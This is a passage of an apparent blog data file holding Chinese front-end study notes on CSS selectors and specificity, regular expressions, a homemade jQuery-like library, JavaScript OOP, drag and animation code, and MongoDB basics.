&#123;padding-left:20px;&#125;#nav li * &#123;padding-left:0;&#125; 相邻同胞选择器，用于定位同一个父元素下某个元素之后的元素(根据一个元素与另一个元素的相邻关系应用样式) 1h2+p &#123;font-size:1.3em;&#125; 属性选择器，根据某个属性是否存在或属性的值来寻找元素 123456789/* 解释某些内容，如缩写词，当鼠标悬停在具有title属性的元素上时，显示提示 */acronym[title] &#123;border-bottom: 1px dotted #999;&#125;acronym[title]:hover, acronym[title]:focus &#123;cursor:help;&#125;/* 使用rel属性值nofollow */a[rel=\"nofollow\"] &#123;padding-right:20px;&#125;/*&lt;a&gt; 标签的 rel 属性用于指定当前文档与被链接文档的关系。 */&lt;a href=\"part_12.html\" rel=\"next\" rev=\"prev\"&gt; 利用属性选择器可以用于IE6 hack，因为IE6不支持属性选择器，而其他现代浏览器支持 12#header &#123;color:red;&#125;[id=\"header\"] &#123;color:blue;&#125; 有些属性可以由多个值，此时可以使用~来表示有此属性即成立 1.blogroll a[rel~=\"co-worker\"] &#123;color:red;&#125; CSS3选择器 特殊性和层叠的作用 通过层叠（cascade）的过程处理css样式规则之间的冲突，为每一个规则分配一个重要度，即权值。 标!important的样式 能优先于任何规则 相同规则特殊性，则后定义的规则优先 特殊性，为每种选择器分配一个值， 大基数（权重）确保非常特殊的选择器（如ID选择器）不会被大量一般选择器（如类型选择器）所超越。 分为4个等级，a，b，c，d 若为行内样式，a=1，权重为1000 b为ID选择器的总数，权重为100 c为类，伪类和属性选择器的数量，权重为10 d为类型选择器和伪元素选择器的数量，权重为11234选择器 特殊性 计算后的值style=\"\" 1,0,0,0 1000#content&#123;&#125; 0,1,0,0 100p.comment .datepost&#123;&#125; 0,0,2,1 21 在body上，使用类表示页面类型，使用ID标识特定页面，可以非常灵活的控制站点设计和布局，编写可维护的代码 12345body.news &#123;&#125;body#archive &#123;&#125;&lt;body id=\"archive\" class=\"news\"&gt; ...&lt;/body&gt; 样式继承，应用样式的元素的后代会继承样式的某些属性，如颜色和字号。与层叠不同，层叠突出覆盖的特性 注释和维护样式表 使用@import url(“xx.css”)导入样式表比链接样式表慢 可以使用/ @group header / 这样的注释风格，作为一种简单而有效的样式表导航方法 站点单一样式表的代码结构 一般样式 主体样式 reset样式 链接 标题 其他元素 辅助样式 表单 通知和错误 一致的条目 页面结构 标题、页脚和导航 布局 其他页面结构元素 页面组件 各个页面 特殊覆盖1234567891011121314/* @group general styles ------------------------*//* @group helper styles ------------------------*//* @group page structure ------------------------*//* @group page components ------------------------*//* @group override------------------------*/","categories":[{"name":"css","slug":"css","permalink":"https://github.com/xmoyKING/categories/css/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://github.com/xmoyKING/tags/Note/"},{"name":"css","slug":"css","permalink":"https://github.com/xmoyKING/tags/css/"},{"name":"CSS-Mastery","slug":"CSS-Mastery","permalink":"https://github.com/xmoyKING/tags/CSS-Mastery/"}]},{"title":"正则表达式基本运用","slug":"reg","date":"2017-01-22T04:43:59.000Z","updated":"2017-01-21T16:00:00.000Z","comments":true,"path":"2017/01/22/reg/","link":"","permalink":"https://github.com/xmoyKING/2017/01/22/reg/","excerpt":"","text":"推荐参考: 正则表达式30分钟入门教程 复习字符串操作 search 查找 substring 获取子字符串 charAt 获取某个字符 split 分割字符串，获得数组 RegExp对象 JS风格 —— new RegExp(&quot;a&quot;, &quot;i&quot;) perl风格 —— /a/i search 字符串搜索 返回出现的位置 忽略大小写：i——ignore 判断浏览器类型 match 获取匹配的项目 量词：+ 量词变化：\\d、\\d\\d和\\d+ 全局匹配：g——global 例子：找出所有数字 replace 替换所有匹配 返回替换后的字符串 例子：敏感词过滤 任意字符 [abc]例子：o[usb]t——obt、ost、out 范围 [a-z]、[0-9]例子：id[0-9]——id0、id5 排除 [^a]例子：o[^0-9]t——oat、o?t、o t 组合 [a-z0-9A-Z] 实例：偷小说，过滤HTML标签： 自定义innerText方法12var re=/&lt;[^&lt;&gt;]+&gt;/g; //过滤html标签value.replace(re, ''); 转义字符 .（点）——任意字符 \\d、\\w、\\s \\D、\\W、\\S 什么是量词 出现的次数 {n,m}，至少出现n次，最多m次 例子：查找QQ号 12345var str='我的QQ是：258344567，你的是4487773吗？';var re=/[1-9]\\d&#123;4,10&#125;/g;alert(str.match(re)); 常用量词 {n,} 至少n次 * 任意次 {0,} ？ 零次或一次 {0,1} + 一次或任意次{1,} {n} 正好n次 常用正则例子 校验邮箱：行首行尾 去除空格：^\\s*|\\s*$ 12345678910var re=/^\\w+@[a-z0-9]+\\.[a-z]&#123;2,4&#125;$/;if(re.test(oTxt.value))&#123; alert('对了');&#125;else&#123; alert('你写错了');&#125; 匹配中文：[\\u4e00-\\u9fa5] 完美版getByClass： 单词边界：\\b12345678910111213141516171819function getByClass(oParent, sClass)&#123; var aEle=oParent.getElementsByTagName('*'); var aResult=[]; var re=new RegExp('\\\\b'+sClass+'\\\\b', 'i'); var i=0; for(i=0;i&lt;aEle.length;i++) &#123; //if(aEle[i].className==sClass) //if(aEle[i].className.search(sClass)!=-1) if(re.test(aEle[i].className)) &#123; aResult.push(aEle[i]); &#125; &#125; return aResult;&#125; 正则表达式符号解释 输入框禁止输入非数字的正则匹配123onkeyup=\"value=value.replace(/[^\\d]/g,'')\" onbeforepaste=\"clipboardData.setData('text',clipboardData.getData('text').replace(/[^\\d]/g,''))\"","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"reg","slug":"reg","permalink":"https://github.com/xmoyKING/tags/reg/"}]},{"title":"类似jQuery的简单自制库","slug":"my-jq","date":"2017-01-22T03:51:08.000Z","updated":"2017-01-21T16:00:00.000Z","comments":true,"path":"2017/01/22/my-jq/","link":"","permalink":"https://github.com/xmoyKING/2017/01/22/my-jq/","excerpt":"","text":"vQuery基础一 vQuery 简介 jQuery 操作简介 “$” 功能介绍 vQuery 选择器实现过程：ID\\class\\tagName click() 方法实现过程 把 new vQuery() 改成 $() show() 和 hide() 方法实现过程 hover() 方法实现过程 css() 方法实现过程 this 在 IE 下使用绑定事件的指向问题 vQuery基础二 show() 与 show.call() 的区别，apply() 与 call() 的区别 用 call() 解决 this 在 IE 下使用绑定事件的指向问题 toggle() 方法简介 闭包特性及其几种怪异的闭包写法 累加计数的实现 toggle() 方法实现过程 attr() 方法实现过程 eq() 方法实现过程 find() 方法实现过程（上半部分） vQuery基础三 find() 方法实现过程 index() 方法实现过程 运用 vQuery 制作选项卡实例 vQuery高级 jQuery 链式操作 css() 函数的改进：支持多属性操作与链式操作 css() 函数多属性操作的实质：传递 json 在 css() 函数内添加判断与循环 json 使用 css() 函数对 div 进行操作 函数链式操作：返回函数自身 给 css() 函数加上：return this; vQuery 的链式操作实例 jQuery 里阻止默认事件、阻止冒泡 添加 bind() 方法 添加 vQuery 阻止默认事件与阻止冒泡的功能 jQuery 里的 animate() vQuery 的插件机制：extend() 运用插件机制为 vQuery 添加 size() 方法 vQuery 里 animate() 方法实现过程 运用 vQuery 制作淘宝幻灯片实例 运用插件机制为 vQuery 添加 drag() 方法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290function myAddEvent(obj, sEv, fn)&#123; if(obj.attachEvent) &#123; obj.attachEvent('on'+sEv, function ()&#123; if(false==fn.call(obj)) &#123; event.cancelBubble=true; return false; &#125; &#125;); &#125; else &#123; obj.addEventListener(sEv, function (ev)&#123; if(false==fn.call(obj)) &#123; ev.cancelBubble=true; ev.preventDefault(); &#125; &#125;, false); &#125;&#125;function getByClass(oParent, sClass)&#123; var aEle=oParent.getElementsByTagName('*'); var aResult=[]; var i=0; for(i=0;i&lt;aEle.length;i++) &#123; if(aEle[i].className==sClass) &#123; aResult.push(aEle[i]); &#125; &#125; return aResult;&#125;function getStyle(obj, attr)&#123; if(obj.currentStyle) &#123; return obj.currentStyle[attr]; &#125; else &#123; return getComputedStyle(obj, false)[attr]; &#125;&#125;function VQuery(vArg)&#123; //用来保存选中的元素 this.elements=[]; switch(typeof vArg) &#123; case 'function': //window.onload=vArg; myAddEvent(window, 'load', vArg); break; case 'string': switch(vArg.charAt(0)) &#123; case '#': //ID var obj=document.getElementById(vArg.substring(1)); this.elements.push(obj); break; case '.': //class this.elements=getByClass(document, vArg.substring(1)); break; default: //tagName this.elements=document.getElementsByTagName(vArg); &#125; break; case 'object': this.elements.push(vArg); &#125;&#125;VQuery.prototype.click=function (fn)&#123; var i=0; for(i=0;i&lt;this.elements.length;i++) &#123; myAddEvent(this.elements[i], 'click', fn); &#125; return this;&#125;;VQuery.prototype.show=function ()&#123; var i=0; for(i=0;i&lt;this.elements.length;i++) &#123; this.elements[i].style.display='block'; &#125; return this;&#125;;VQuery.prototype.hide=function ()&#123; var i=0; for(i=0;i&lt;this.elements.length;i++) &#123; this.elements[i].style.display='none'; &#125; return this;&#125;;VQuery.prototype.hover=function (fnOver, fnOut)&#123; var i=0; for(i=0;i&lt;this.elements.length;i++) &#123; myAddEvent(this.elements[i], 'mouseover', fnOver); myAddEvent(this.elements[i], 'mouseout', fnOut); &#125; return this;&#125;;VQuery.prototype.css=function (attr, value)&#123; if(arguments.length==2) //设置样式 &#123; var i=0; for(i=0;i&lt;this.elements.length;i++) &#123; this.elements[i].style[attr]=value; &#125; &#125; else //获取样式 &#123; if(typeof attr=='string') &#123; //return this.elements[0].style[attr]; return getStyle(this.elements[0], attr); &#125; else &#123; for(i=0;i&lt;this.elements.length;i++) &#123; var k=''; for(k in attr) &#123; this.elements[i].style[k]=attr[k]; &#125; &#125; &#125; &#125; return this;&#125;;VQuery.prototype.attr=function (attr, value)&#123; if(arguments.length==2) &#123; var i=0; for(i=0;i&lt;this.elements.length;i++) &#123; this.elements[i][attr]=value; &#125; &#125; else &#123; return this.elements[0][attr]; &#125; return this;&#125;;VQuery.prototype.toggle=function ()&#123; var i=0; var _arguments=arguments; for(i=0;i&lt;this.elements.length;i++) &#123; addToggle(this.elements[i]); &#125; function addToggle(obj) &#123; var count=0; myAddEvent(obj, 'click', function ()&#123; _arguments[count++%_arguments.length].call(obj); &#125;); &#125; return this;&#125;;VQuery.prototype.eq=function (n)&#123; return $(this.elements[n]);&#125;;function appendArr(arr1, arr2)&#123; var i=0; for(i=0;i&lt;arr2.length;i++) &#123; arr1.push(arr2[i]); &#125;&#125;VQuery.prototype.find=function (str)&#123; var i=0; var aResult=[]; for(i=0;i&lt;this.elements.length;i++) &#123; switch(str.charAt(0)) &#123; case '.': //class var aEle=getByClass(this.elements[i], str.substring(1)); aResult=aResult.concat(aEle); break; default: //标签 var aEle=this.elements[i].getElementsByTagName(str); //aResult=aResult.concat(aEle); appendArr(aResult, aEle); &#125; &#125; var newVquery=$(); newVquery.elements=aResult; return newVquery;&#125;;function getIndex(obj)&#123; var aBrother=obj.parentNode.children; var i=0; for(i=0;i&lt;aBrother.length;i++) &#123; if(aBrother[i]==obj) &#123; return i; &#125; &#125;&#125;VQuery.prototype.index=function ()&#123; return getIndex(this.elements[0]);&#125;;VQuery.prototype.bind=function (sEv, fn)&#123; var i=0; for(i=0;i&lt;this.elements.length;i++) &#123; myAddEvent(this.elements[i], sEv, fn); &#125;&#125;;VQuery.prototype.extend=function (name, fn)&#123; VQuery.prototype[name]=fn;&#125;;function $(vArg)&#123; return new VQuery(vArg);&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172$().extend('animate', function (json)&#123; var i=0; for(i=0;i&lt;this.elements.length;i++) &#123; startMove(this.elements[i], json); &#125; function getStyle(obj, attr) &#123; if(obj.currentStyle) &#123; return obj.currentStyle[attr]; &#125; else &#123; return getComputedStyle(obj, false)[attr]; &#125; &#125; function startMove(obj, json, fn) &#123; clearInterval(obj.timer); obj.timer=setInterval(function ()&#123; var bStop=true; //这一次运动就结束了——所有的值都到达了 for(var attr in json) &#123; //1.取当前的值 var iCur=0; if(attr=='opacity') &#123; iCur=parseInt(parseFloat(getStyle(obj, attr))*100); &#125; else &#123; iCur=parseInt(getStyle(obj, attr)); &#125; //2.算速度 var iSpeed=(json[attr]-iCur)/8; iSpeed=iSpeed&gt;0?Math.ceil(iSpeed):Math.floor(iSpeed); //3.检测停止 if(iCur!=json[attr]) &#123; bStop=false; &#125; if(attr=='opacity') &#123; obj.style.filter='alpha(opacity:'+(iCur+iSpeed)+')'; obj.style.opacity=(iCur+iSpeed)/100; &#125; else &#123; obj.style[attr]=iCur+iSpeed+'px'; &#125; &#125; if(bStop) &#123; clearInterval(obj.timer); if(fn) &#123; fn(); &#125; &#125; &#125;, 30) &#125;&#125;); 1234567891011121314151617181920212223242526272829303132$().extend('drag', function ()&#123; var i=0; for(i=0;i&lt;this.elements.length;i++) &#123; drag(this.elements[i]); &#125; function drag(oDiv) &#123; oDiv.onmousedown=function (ev) &#123; var oEvent=ev||event; var disX=oEvent.clientX-oDiv.offsetLeft; var disY=oEvent.clientY-oDiv.offsetTop; document.onmousemove=function (ev) &#123; var oEvent=ev||event; oDiv.style.left=oEvent.clientX-disX+'px'; oDiv.style.top=oEvent.clientY-disY+'px'; &#125;; document.onmouseup=function () &#123; document.onmousemove=null; document.onmouseup=null; &#125;; &#125;; &#125;&#125;);","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"jquery","slug":"jquery","permalink":"https://github.com/xmoyKING/tags/jquery/"},{"name":"lib","slug":"lib","permalink":"https://github.com/xmoyKING/tags/lib/"}]},{"title":"js-event-wheel","slug":"js-event-wheel","date":"2017-01-22T03:46:52.000Z","updated":"2017-01-21T16:00:00.000Z","comments":true,"path":"2017/01/22/js-event-wheel/","link":"","permalink":"https://github.com/xmoyKING/2017/01/22/js-event-wheel/","excerpt":"","text":"自定义滚动条实例 限制拖拽范围原理应用 用滚动条控制DIV透明度实例 用滚动条控制文字上下滚动实例 IE下鼠标滚轮事件：onmousewheel DOM事件：DOMMouseScroll IE、FF、Chrome三种浏览器对鼠标滚轮事件的支持情况 封装兼容鼠标滚轮事件的函数 IE：wheelDelta、FF：detail 用封装的鼠标滚轮事件制作DIV高度变化实例 配合鼠标滚轮事件制作DIV滚动条实例 自定义滚动条——配合鼠标滚轮: 鼠标滚轮，在方块内控制方块长度","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"}]},{"title":"js实现面向对象","slug":"oop-of-js","date":"2017-01-21T06:57:06.000Z","updated":"2017-01-20T16:00:00.000Z","comments":true,"path":"2017/01/21/oop-of-js/","link":"","permalink":"https://github.com/xmoyKING/2017/01/21/oop-of-js/","excerpt":"","text":"js实现面向对象的方法 面向过程转化为面向对象的步骤（选项卡实例） JS 里的继承方式 call（构造函数伪装） 和 prototype（原型链） 引用类型的特点（引用相当于钥匙，存储空间相当于房子） 原型继承的缺点及解决方案 instanceof 作用：查看某个对象是否是某个类的实例 用继承来实现拖拽实例 系统对象：宿主对象（BOM和DOM）、内置对象（静态对象：Global和Math）、本地对象 继承的优势：修改父类bug，子类自动继承 选项卡普通方式123456789101112131415161718192021222324252627var aBtn=null;var aDiv=null;window.onload=function ()&#123; var oDiv=document.getElementById('div1'); aBtn=oDiv.getElementsByTagName('input'); aDiv=oDiv.getElementsByTagName('div'); var i=0; for(i=0;i&lt;aBtn.length;i++) &#123; aBtn[i].index=i; aBtn[i].onclick=tab; &#125;&#125;;function tab()&#123; for(i=0;i&lt;aBtn.length;i++) &#123; aBtn[i].className=''; aDiv[i].style.display='none'; &#125; this.className='active'; aDiv[this.index].style.display='block';&#125; 转变为oop方式12345678910111213141516171819202122232425262728293031323334window.onload=function ()&#123; var oTab=new TabSwitch('div1');&#125;;function TabSwitch(id)&#123; var oDiv=document.getElementById(id); this.aBtn=oDiv.getElementsByTagName('input'); this.aDiv=oDiv.getElementsByTagName('div'); var i=0; var _this=this; for(i=0;i&lt;this.aBtn.length;i++) &#123; this.aBtn[i].index=i; this.aBtn[i].onclick=function () &#123; _this.tab(this); &#125;; &#125;&#125;TabSwitch.prototype.tab=function (oBtn)&#123; for(i=0;i&lt;this.aBtn.length;i++) &#123; this.aBtn[i].className=''; this.aDiv[i].style.display='none'; &#125; oBtn.className='active'; this.aDiv[oBtn.index].style.display='block';&#125;; js继承12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849function Person(name, sex)&#123; this.name=name; this.sex=sex;&#125;Person.prototype.showName=function ()&#123; alert(this.name);&#125;;Person.prototype.showSex=function ()&#123; alert(this.sex);&#125;;//-------------------------------------function Worker(name, sex, job)&#123; //this-&gt;new出来的Worker对象 //构造函数伪装 调用父级的构造函数——为了继承属性 Person.call(this, name, sex); this.job=job;&#125;//原型链 通过原型来继承父级的方法//Worker.prototype=Person.prototype;for(var i in Person.prototype)&#123; Worker.prototype[i]=Person.prototype[i];&#125;Worker.prototype.showJob=function ()&#123; alert(this.job);&#125;;var oP=new Person('blue', '男');var oW=new Worker('blue', '男', '打杂的');oP.showName();oP.showSex();oW.showName();oW.showSex();oW.showJob(); 继承实现拖拽能将一个物体拖拽,调用方式： new Drag(&#39;div1&#39;); 普通拖拽类 new LimitDrag(&#39;div2&#39;); 有限制的拖拽1234567891011121314151617181920212223242526272829303132333435363738394041424344454647function Drag(id)&#123; var _this=this; this.disX=0; this.disY=0; this.oDiv=document.getElementById(id); this.oDiv.onmousedown=function (ev) &#123; _this.fnDown(ev); return false; &#125;;&#125;Drag.prototype.fnDown=function (ev)&#123; var _this=this; var oEvent=ev||event; this.disX=oEvent.clientX-this.oDiv.offsetLeft; this.disY=oEvent.clientY-this.oDiv.offsetTop; document.onmousemove=function (ev) &#123; _this.fnMove(ev); &#125;; document.onmouseup=function () &#123; _this.fnUp(); &#125;;&#125;;Drag.prototype.fnMove=function (ev)&#123; var oEvent=ev||event; this.oDiv.style.left=oEvent.clientX-this.disX+'px'; this.oDiv.style.top=oEvent.clientY-this.disY+'px';&#125;;Drag.prototype.fnUp=function ()&#123; document.onmousemove=null; document.onmouseup=null;&#125;; 继承自Drag类的LimitDrag类对拖拽范围有限制 123456789101112131415161718192021222324252627282930313233343536373839function LimitDrag(id)&#123; Drag.call(this, id);&#125;//LimitDrag.prototype=Drag.prototype;for(var i in Drag.prototype)&#123; LimitDrag.prototype[i]=Drag.prototype[i];&#125;LimitDrag.prototype.fnMove=function (ev)&#123; var oEvent=ev||event; var l=oEvent.clientX-this.disX; var t=oEvent.clientY-this.disY; if(l&lt;0) &#123; l=0; &#125; else if(l&gt;document.documentElement.clientWidth-this.oDiv.offsetWidth) &#123; l=document.documentElement.clientWidth-this.oDiv.offsetWidth; &#125; if(t&lt;0) &#123; t=0; &#125; else if(t&gt;document.documentElement.clientHeight-this.oDiv.offsetHeight) &#123; t=document.documentElement.clientHeight-this.oDiv.offsetHeight; &#125; this.oDiv.style.left=l+'px'; this.oDiv.style.top=t+'px';&#125;;","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"oop","slug":"oop","permalink":"https://github.com/xmoyKING/tags/oop/"}]},{"title":"原生js动画函数","slug":"native-js-animate-function","date":"2017-01-20T12:02:18.000Z","updated":"2017-01-19T16:00:00.000Z","comments":true,"path":"2017/01/20/native-js-animate-function/","link":"","permalink":"https://github.com/xmoyKING/2017/01/20/native-js-animate-function/","excerpt":"","text":"事件高级（一） 给元素添加事件的问题 事件绑定的意义 事件绑定：IE - attachEvent、W3C - addEventListener 兼容性处理 封装事件绑定函数 IE下事件绑定this指向的问题 解除事件绑定、匿名函数的特性 拖拽原理回顾 封装可重用的拖拽实例 事件高级（二） 可重用的选项卡实例 限制范围的拖拽实例 磁性吸附的拖拽实例 解决拖拽问题一：选中文字 事件捕获：setCapture()与releaseCapture() 合并代码，共用函数 碰撞检测原理 与DOM配合，制作带框的拖拽实例 处理带框拖拽的细节部分 用拖拽改变DIV大小实例 属性动画： 支持回调函数 支持多属性同时变化 需要注意： offsetWidth类的属性包括border和width，所以需要使用计算后的属性值此时可以使用currentStyle或getComputedStyle两种方法 需要注意是否所有属性都完成了才取消定时器，否则第一个完成属性后其他属性无法变化 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051//获取当前o元素的attr属性cfunction getStyle(o, attr)&#123; if(o.currentStyle) return o.currentStyle[attr]; else return getComputedStyle(o, false)[attr];&#125;//动画函数 o为目标元素，json为一个包含变化属性和预期值的对象// fn为完成此动画后的回调，可以继续使用animate形成延时动画function animate(o, json, fn)&#123; var itime = 30; //定时器时间 var iS = 8; //动画速度基准，越大越慢 clearInterval(o.timer); //清除上次在o元素上使用的定时器，防止动画重复 o.timer = setInterval(function()&#123; var bStop = true; //当所有值都变化为预期值后，标识此次动画结束 for(var attr in json)&#123; // 1. 获取当前该attr的值 var iCur = 0; if(attr == 'opacity') //防止小数与误差 iCur = parseInt(parseFloat(getStyle(o, attr))*100); else iCur = parseInt(getStyle(o, attr)); // 2. 算速度，防止小数误差积累，需要使用取整 var iSpeed = (json[attr]-iCur)/iS; iSpeed = iSpeed&gt;0 ? Math.ceil(iSpeed) : Math.floor(iSpeed); //正反速度区别对待 // 3. 检测停止，每一轮定时，只要有一个属性未到预期值则设置为false if(iCur != json[attr]) bStop = false; // 4. 透明度和其他属性单位不同 if(attr == 'opacity') o.style.opacity = (iCur + iSpeed)/100; else o.style[attr] = iCur + iSpeed + 'px'; &#125; // 5. 检测所有属性是否完成 if(bStop)&#123; clearInterval(o.timer); if(fn) fn(); &#125; &#125;, itime);&#125; 弹性运动： 加速运动：步长越来越大 减速运动：步长越来越小，直到负值 引入摩擦力系数，变成弹性公式 应用弹性公式：滑动菜单实例 解决数值精度问题：引入变量累加消除小数 弹性运动的停止条件：目标与速度为零 弹性运动的适用范围：不能运用于物体超过原大小的动画 123456789101112131415161718192021var iSpeed = 0;var left = 0;function startMove(obj, iTarget) &#123; clearInterval(obj.timer); //防止一元素多次触发 obj.timer = setInterval(function() &#123; //用预期位值和当前位置（offsetLeft）的差作为速度，系数5，越大则速度越小 iSpeed += (iTarget - obj.offsetLeft) / 5; iSpeed *= 0.7; //0.7模拟摩擦力系数，越大则摩擦力越小 left += iSpeed; //使用绝对值，将速度和距离差小于1像素当作0处理 if (Math.abs(iSpeed) &lt; 1 &amp;&amp; Math.abs(left - iTarget) &lt; 1) &#123; clearInterval(obj.timer); obj.style.left = iTarget + 'px'; //防止出现1像素的误差，结束动画时强制设置为预期值 &#125; else &#123; obj.style.left = left + 'px'; &#125; &#125;, 30);&#125; 碰撞运动： 碰撞运动：无重力情况下的变化 消除运动过界时窗口出现滚动条 带重力的碰撞运动：向下的力不断递减 正小数与负小数对样式的影响 生成拖拽轨迹，计算拖拽速度 拖拽+碰撞+重力消除bug，最终演示实例 碰撞运动停止条件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394window.onload = function() &#123; var oDiv = document.getElementById('div1'); var lastX = 0; var lastY = 0; //拖拽需要监听鼠标按下事件以及传入event对象用于计算拖拽丢出的初速度 oDiv.onmousedown = function(ev) &#123; var oEvent = ev || event; var disX = oEvent.clientX - oDiv.offsetLeft; var disY = oEvent.clientY - oDiv.offsetTop; document.onmousemove = function(ev) &#123; var oEvent = ev || event; var l = oEvent.clientX - disX; var t = oEvent.clientY - disY; oDiv.style.left = l + 'px'; oDiv.style.top = t + 'px'; iSpeedX = l - lastX; iSpeedY = t - lastY; lastX = l; lastY = t; document.title = 'x:' + iSpeedX + ', y:' + iSpeedY; &#125;; document.onmouseup = function() &#123; document.onmousemove = null; document.onmouseup = null; startMove(); &#125;; clearInterval(timer); &#125;;&#125;;var timer = null;var iSpeedX = 0;var iSpeedY = 0;function startMove() &#123; clearInterval(timer); timer = setInterval(function() &#123; var oDiv = document.getElementById('div1'); iSpeedY += 3; var l = oDiv.offsetLeft + iSpeedX; var t = oDiv.offsetTop + iSpeedY; if (t &gt;= document.documentElement.clientHeight - oDiv.offsetHeight) &#123; iSpeedY *= -0.8; iSpeedX *= 0.8; t = document.documentElement.clientHeight - oDiv.offsetHeight; &#125; else if (t &lt;= 0) &#123; iSpeedY *= -1; iSpeedX *= 0.8; t = 0; &#125; if (l &gt;= document.documentElement.clientWidth - oDiv.offsetWidth) &#123; iSpeedX *= -0.8; l = document.documentElement.clientWidth - oDiv.offsetWidth; &#125; else if (l &lt;= 0) &#123; iSpeedX *= -0.8; l = 0; &#125; //当速度足够小时（绝对值小于1），直接设为0 if (Math.abs(iSpeedX) &lt; 1) &#123; iSpeedX = 0; &#125; if (Math.abs(iSpeedY) &lt; 1) &#123; iSpeedY = 0; &#125; //终止条件为：x，y方向上的速度都为0，且到达目标点 if (iSpeedX == 0 &amp;&amp; iSpeedY == 0 &amp;&amp; t == document.documentElement.clientHeight - oDiv.offsetHeight) &#123; clearInterval(timer); &#125; else &#123; oDiv.style.left = l + 'px'; oDiv.style.top = t + 'px'; &#125; document.title = iSpeedX; &#125;, 30);&#125;","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"animate","slug":"animate","permalink":"https://github.com/xmoyKING/tags/animate/"}]},{"title":"mongodb入门概念","slug":"mongodb-begin","date":"2016-11-13T15:02:55.000Z","updated":"2017-12-06T14:50:09.368Z","comments":true,"path":"2016/11/13/mongodb-begin/","link":"","permalink":"https://github.com/xmoyKING/2016/11/13/mongodb-begin/","excerpt":"","text":"数据库为数据提供可靠的持久存储，数据库放在服务端，而客户端的数据存储时临时的，终端容易发生应用错误，用户错误或被篡改，同时客户端数据也难以点对点分享（必须双方在线）。 数据库类型非常多，每一种都有所擅长和缺点，mongodb的目标是成为通用数据库，而数据库使用mongodb非常适合单页面应用，这样前后端都使用js、json。 最大的好处就是消除了数据转换，因为前端向后端传JSON，后端向数据库传JSON，没有数据转换使得复杂的系统变得简单一些，同时也降低了风险，维护也更方便。 根据mongodb官网描述： mongodb是一种可扩展的，高性能的、开源的NoSQL数据库，面向文档的存储，使用动态schema来提供简洁而强大的功能。逐个分析： 可扩展、高性能： mongodb被设计为可使用普通的服务器进行水平扩展，能够很容易添加额外服务，扩展容量或性能。 面向文档的存储： mongodb用JSON格式存储数据，而不是表，文档以集合的形式进行存储（可类比表，但区别明显） 动态schema： 关系型数据库需要schema来定义什么数据可以存储在什么表中，而mongodb不用一开始就定义，可以在集合中存储任何json文档，在同一个集合中的文档，可以完全有不同的结构，在更新文档的时候可以彻底改变文档结构。 关于动态文档结构：mongodb不限制文档结构，不用定义结构就可以在集合中添加文档。甚至不需要先创建集合，向不存在的集合中插入数据时会新建集合，对比关系型数据库，必须明确定义表和schema，对数据结构的任何改动都需要修改schema。 而不需要schema的数据就有如下的一些有点： 文档结构灵活。不管时什么结构，mongodb都会存储文档，若文档结构频繁更改或文档没有结构，不需要对它们进行调整，mongodb会直接存储。 经常变化的应用不需要更改数据库。当更新文档而有了新的或者是不同的属性时，可以直接部署应用，它会立即开始保存新的文档结构。否则可能需要修改代码，为以前保存的文档增加不存在的文档属性。 没有会引起停机或延时的schema变化，不必锁定数据库的部分功能（关系型数据库在变化schema时需要锁定数据库的一些功能） 不需要schema设计的专业知识（即：上手快，门槛低） 其实所有的不需要schema定义的数据库都有如下的缺点，也包括mongodb： 没有强制的文档结构。没有在数据库级别强制文档结构，对文档结构的任何修改都不会自动传播给已经存在的文档，当多个应用使用相同的集合时会非常痛苦 没有文档结构的定义。数据库中没有地方为数据库程序员或应用来确定数据结构是什么。通过查看文档来确定集合的目的比较困难，因为无法保证文档与文档之间的结构是一样的。 没有明确的定义。文档数据库没有数学上的明确定义，当在关系型数据库中存储数据时，经常有数学上可证明的最佳实践做参考，使得数据访问尽可能的快和灵活。对mongodb的优化也没有明确的定义，尽管一些传统的方法是有的，如索引。 mongolab 通过Mongolab申请免费的MongoDB测试实例 示例：通过nodejs将文件上传到mongodb","categories":[{"name":"mongodb","slug":"mongodb","permalink":"https://github.com/xmoyKING/categories/mongodb/"}],"tags":[{"name":"mongodb","slug":"mongodb","permalink":"https://github.com/xmoyKING/tags/mongodb/"}]},{"title":"javascript多线程","slug":"js-thread","date":"2016-11-11T13:04:34.000Z","updated":"2016-11-11T13:04:34.000Z","comments":true,"path":"2016/11/11/js-thread/","link":"","permalink":"https://github.com/xmoyKING/2016/11/11/js-thread/","excerpt":"","text":"了解js多线程，主要分为Concurrent.Thread.js（对不支持webwork的浏览器）和WebWork两部分 JavaScript多线程初步学习 拔开云雾见明月 透析JavaScript定时机制 从JavaScript的单线程执行说起 Concurrent.Thread.js利用setTimeout和setInterval模拟多线程的一个库 github备份地址 JavaScript 编写线程代码引用Concurrent.Thread.js 阅读源码需对setTimeout和setInterval有相当的理解才行！ WebWorkH5标准规范，是真正的多线程，但是切记，不能对DOM进行操作。 HTML5新功能之八 《web works多线程》 深入 HTML5 Web Worker 应用实践：多线程编程 